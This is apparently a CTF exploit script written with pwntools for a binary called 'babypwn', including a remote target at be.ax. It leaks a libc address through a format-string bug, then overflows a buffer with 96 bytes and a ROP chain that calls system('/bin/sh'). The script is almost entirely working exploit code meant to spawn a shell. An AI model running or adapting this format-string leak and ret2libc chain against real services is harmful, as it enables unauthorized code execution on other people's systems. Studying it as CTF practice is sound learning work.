#!/usr/bin/python3

from pwn import *

elf = ELF('babypwn')
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b main",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("be.ax", 31801)
	else:
		return process(elf.path, env=env)


p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

# 17 moj fmt string
sla(b'What is your name?\n', b"%2$lx")
leak = rl().strip().decode()[4:]
libc_base = int(leak, 16) + 0x2000 - 0xbc0
ls(f'libc base: {hex(libc_base)}')

libc = ELF('./libc.so.6')
rop = ROP(libc)
libc.address = libc_base

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols["system"]
EXIT = libc.symbols["exit"]
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] + libc_base
RET = (rop.find_gadget(['ret']))[0] + libc_base


sla(b'emote?', b'A' * 96 + p64(POP_RDI) + p64(BINSH) + p64(RET) + p64(SYSTEM) + p64(EXIT))
# sla(b'emote?', cyclic(200, n=8))

ia()
